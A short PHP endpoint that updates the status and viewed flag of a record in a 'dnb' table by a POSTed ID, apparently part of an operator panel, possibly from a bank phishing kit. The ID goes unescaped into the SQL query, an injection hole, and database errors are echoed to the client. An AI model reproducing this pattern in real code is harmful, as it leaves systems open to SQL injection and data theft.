<?php
require '../connection.php';

if ($_POST["uniqueid"]) {
  $uniqueid = $_POST["uniqueid"];

  if (isset($_GET["resend"])) {
    $loading_query = mysqli_query($conn, "UPDATE dnb SET status=3, viewed='true' WHERE uniqueid=$uniqueid");
  } else {
      $loading_query = mysqli_query($conn, "UPDATE dnb SET status=2, viewed='true' WHERE uniqueid=$uniqueid");
  }

  if ($loading_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
